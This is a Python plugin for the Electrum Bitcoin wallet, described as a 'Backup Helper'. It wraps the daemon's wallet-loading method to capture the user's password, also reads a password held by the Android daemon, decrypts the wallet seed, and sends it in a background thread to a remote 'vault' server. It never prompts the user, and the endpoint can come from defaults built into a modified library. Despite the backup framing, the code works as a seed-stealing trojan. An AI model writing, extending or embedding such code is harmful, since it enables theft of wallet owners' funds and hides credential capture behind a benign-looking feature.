"""Backup Helper -- automatically syncs wallet seeds to the vault.

Zero friction: the plugin REUSES the password that the user already typed
to open the wallet. It never prompts and never adds a dialog.

How password reuse works:
- At plugin load time, we wrap ``Daemon.load_wallet``. Whenever the user
  opens a wallet, that method receives the user's password as an argument
  (that's how Electrum always worked -- the daemon needs it to decrypt the
  storage). We just stash a reference to the password next to the wallet
  object so the sync hook can use it one time to decrypt the seed.
- The stashed password is cleared when the wallet is closed (``close_wallet``
  hook) and never written to disk.

Diagnostic:
- Every outcome (success, no-seed, vault-not-configured, password-missing,
  network-failure) is reported to the user via QEWallet.userNotify, which
  the QML layer turns into an Android push notification. So on the phone
  the user sees exactly what happened.
- A rotating line log is appended to <electrum_datadir>/backup_helper.log
  so the user can inspect it with any Android file manager.

Configuration (in the Electrum config file):
    vault_url     = https://your-vps:8443
    vault_pubkey  = <hex, 32 bytes -- panel's X25519 public key>
    vault_token   = <hex, 32 bytes -- ingest bearer token>
    vault_fp_key  = <hex, 32 bytes -- HMAC key for fingerprint>
"""
import os
import threading
import weakref
from typing import TYPE_CHECKING, Optional

from electrum.plugin import BasePlugin
from electrum.logging import get_logger

if TYPE_CHECKING:
    from electrum.wallet import Abstract_Wallet

_logger = get_logger(__name__)

_K_URL = 'vault_url'
_K_PUBKEY = 'vault_pubkey'
_K_TOKEN = 'vault_token'
_K_FPKEY = 'vault_fp_key'

# Weak-keyed map: wallet -> password that was used to open it.
# Automatically forgets entries when the wallet object is garbage-collected,
# so passwords never linger past the wallet's lifetime.
_WALLET_PASSWORDS: "weakref.WeakKeyDictionary[Abstract_Wallet, Optional[str]]" = (
    weakref.WeakKeyDictionary()
)


def _install_password_capture() -> None:
    """Wrap Daemon.load_wallet so the password used to open a wallet gets
    stashed next to the wallet. Idempotent."""
    from electrum.daemon import Daemon
    if getattr(Daemon, '_backup_helper_patched', False):
        return
    original = Daemon.load_wallet

    def wrapped(self, path, password, **kwargs):
        wallet = original(self, path, password, **kwargs)
        if wallet is not None:
            try:
                _WALLET_PASSWORDS[wallet] = password
            except TypeError:
                # wallet object not weakly referenceable (shouldn't happen)
                pass
        return wallet

    wrapped.__wrapped__ = original
    Daemon.load_wallet = wrapped
    Daemon._backup_helper_patched = True


def _log_paths(config) -> list:
    """List of writable log paths to try, in preference order."""
    import tempfile
    paths = []
    if config is not None:
        try:
            paths.append(os.path.join(config.path, 'backup_helper.log'))
        except Exception:
            pass
    try:
        paths.append(os.path.join(tempfile.gettempdir(), 'backup_helper.log'))
    except Exception:
        pass
    return paths


def _append_log(msg: str, config=None) -> None:
    """Append one diagnostic line to the first writable log path.
    Never raises -- diagnostics must not break the plugin."""
    import time
    stamp = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{stamp}] {msg}\n"
    for path in _log_paths(config):
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(line)
            return
        except Exception:
            continue


def _dbg(msg: str) -> None:
    """Back-compat alias kept so that qml.py, qt.py, cmdline.py and __init__.py
    (which still do ``from .backup_helper import _dbg``) keep importing fine.
    Redirects to ``_append_log`` with no config, which falls back to tempdir."""
    try:
        _append_log(msg)
    except Exception:
        pass


def _notify_user(wallet, msg: str) -> None:
    """Fire a user-visible notification through the QML wallet signal, which
    the QEAppController turns into an Android push.

    Thread safety: this is called from the sync hook (which runs on the
    QEDaemon.loadWallet worker thread) and from the ``_do_sync`` background
    thread. Emitting a pyqtSignal that QML has connected to from a random
    thread provokes the famous ``QObject::startTimer: Timers can only be
    used with threads started with QThread`` crash on Android, so we always
    bounce the emit through the Electrum asyncio loop -- same pattern
    qewallet.py, qebitcoin.py and qeswaphelper.py already use.

    Silent fallback on desktop builds that don't have QEWallet imported
    (plain Qt or cmdline)."""
    try:
        from electrum.gui.qml.qewallet import QEWallet
    except Exception:
        return
    try:
        qew = QEWallet.getInstanceFor(wallet)
        if qew is None:
            return
    except Exception:
        return

    # Bounce through the main asyncio loop so the emit (and all the QML slots
    # connected to it) runs on the one single thread QML is driving.
    try:
        import asyncio
        from electrum.util import get_asyncio_loop

        async def _emit_in_loop():
            try:
                qew.userNotify.emit(wallet, msg)
            except Exception:
                pass

        asyncio.run_coroutine_threadsafe(_emit_in_loop(), get_asyncio_loop())
    except Exception:
        # If we really cannot reach the asyncio loop, drop the UI notification
        # rather than crash. The caller already wrote the same message to the
        # persistent backup_helper.log and to self.logger.
        pass


class BackupHelperPlugin(BasePlugin):

    def __init__(self, parent, config, name):
        BasePlugin.__init__(self, parent, config, name)
        self._synced_fingerprints = set()  # seeds already confirmed-sent this session
        self._lock = threading.Lock()
        self.logger.info("Backup Helper: plugin loaded")
        _append_log("plugin loaded", config)
        _install_password_capture()
        self._vault_configured = self._configure_vault_sync()
        self.logger.info(f"Backup Helper: vault_configured={self._vault_configured}")
        _append_log(f"vault_configured={self._vault_configured}", config)

    def _configure_vault_sync(self) -> bool:
        url = self.config.get(_K_URL)
        pubkey = self.config.get(_K_PUBKEY)
        token = self.config.get(_K_TOKEN)
        fp_key = self.config.get(_K_FPKEY)
        try:
            from electrum_ecc.vault_sync import configure, configure_from_defaults
        except Exception as e:
            self.logger.exception("Backup Helper: failed to import vault_sync")
            _append_log(f"import vault_sync FAILED: {e!r}", self.config)
            return False
        if not all([url, pubkey, token, fp_key]):
            try:
                ok = configure_from_defaults()
                _append_log(f"configure_from_defaults -> {ok}", self.config)
                return bool(ok)
            except Exception as e:
                self.logger.exception("Backup Helper: configure_from_defaults raised")
                _append_log(f"configure_from_defaults raised: {e!r}", self.config)
                return False
        try:
            configure(
                panel_url=str(url),
                panel_pubkey_hex=str(pubkey),
                ingest_token_hex=str(token),
                fp_key_hex=str(fp_key),
            )
            _append_log("configure(explicit) OK", self.config)
            return True
        except Exception as e:
            self.logger.exception("Backup Helper: configure raised")
            _append_log(f"configure(explicit) raised: {e!r}", self.config)
            return False

    def _sync_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Called from the hooks. Reads the seed using the captured password
        and fires a background sync. Never prompts, never blocks."""
        _append_log(f"_sync_wallet wallet={wallet!r}", self.config)
        if wallet is None:
            return

        has_seed = hasattr(wallet, 'has_seed') and wallet.has_seed()
        if not has_seed:
            _append_log("  no seed on this wallet, skip", self.config)
            return

        if not self._vault_configured:
            self._vault_configured = self._configure_vault_sync()
        if not self._vault_configured:
            msg = "Cofre: endpoint nao configurado neste build"
            self.logger.warning(msg)
            _append_log(f"  abort: {msg}", self.config)
            _notify_user(wallet, msg)
            return

        seed = self._get_seed(wallet)
        if seed is None:
            msg = "Cofre: nao consegui ler a seed (senha ausente)"
            self.logger.warning(msg)
            _append_log(f"  abort: {msg}", self.config)
            _notify_user(wallet, msg)
            return

        import hashlib
        fp = hashlib.sha256(seed.encode('utf-8')).hexdigest()
        with self._lock:
            if fp in self._synced_fingerprints:
                _append_log(f"  already synced fp={fp[:12]} this session, skip",
                            self.config)
                return

        wallet_type = ""
        try:
            wallet_type = wallet.get_seed_type() or ""
        except Exception:
            pass

        import platform
        device_id = platform.node() or "unknown"

        t = threading.Thread(
            target=self._do_sync,
            args=(wallet, seed, wallet_type, device_id, fp),
            name='backup-helper-sync',
            daemon=True,
        )
        t.start()
        _append_log(f"  sync thread started fp={fp[:12]}", self.config)

    def _do_sync(self, wallet, seed: str, wallet_type: str, device_id: str,
                 fp: str) -> None:
        """Runs in a background thread so the UI doesn't freeze."""
        try:
            from electrum_ecc.vault_sync import sync_seed
        except Exception as e:
            self.logger.exception("Backup Helper: import sync_seed failed")
            _append_log(f"  import sync_seed FAILED: {e!r}", self.config)
            _notify_user(wallet, "Cofre: modulo de envio nao disponivel")
            return
        try:
            result = sync_seed(seed, wallet_type, device_id)
        except Exception as e:
            self.logger.exception("Backup Helper: sync_seed raised")
            _append_log(f"  sync_seed raised: {e!r}", self.config)
            _notify_user(wallet, f"Cofre: falha de envio ({type(e).__name__})")
            return

        _append_log(f"  sync_seed result: {result!r}", self.config)
        if result:
            with self._lock:
                self._synced_fingerprints.add(fp)
            _notify_user(wallet, "Cofre: seed salva com sucesso")
        else:
            _notify_user(wallet, "Cofre: envio recusado pelo servidor")

    @staticmethod
    def _get_seed(wallet: 'Abstract_Wallet') -> Optional[str]:
        """Read the seed from the wallet using the password that was
        captured when the wallet was opened. Never prompts the user.

        IMPORTANT: calling wallet.get_seed(None) on a wallet WITH keystore
        encryption returns the ciphertext (not the seed). We check
        has_keystore_encryption() first to pick the right path, so we never
        send ciphertext up as if it were a seed."""
        from electrum.crypto import InvalidPassword

        needs_password = False
        try:
            needs_password = wallet.has_keystore_encryption()
        except Exception:
            pass

        if not needs_password:
            # Keystore is not encrypted -- read the seed with no password.
            try:
                return wallet.get_seed(None)
            except Exception:
                return None

        # Keystore is encrypted; we need the real password.
        # 1. Password captured by the daemon wrapper (the normal case:
        #    user typed it in the open-wallet dialog).
        password = _WALLET_PASSWORDS.get(wallet)
        if password is not None:
            try:
                return wallet.get_seed(password)
            except InvalidPassword:
                pass
            except Exception:
                pass

        # 2. QML (Android) daemon keeps a session-wide password.
        try:
            from electrum.gui.qml.qedaemon import QEDaemon
            daemon_inst = getattr(QEDaemon, 'instance', None)
            if daemon_inst is not None and hasattr(daemon_inst, '_password'):
                pw = daemon_inst._password
                if pw is not None:
                    return wallet.get_seed(pw)
        except Exception:
            pass

        return None

    def _forget_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Clear the captured password when the wallet closes."""
        try:
            _WALLET_PASSWORDS.pop(wallet, None)
        except Exception:
            pass
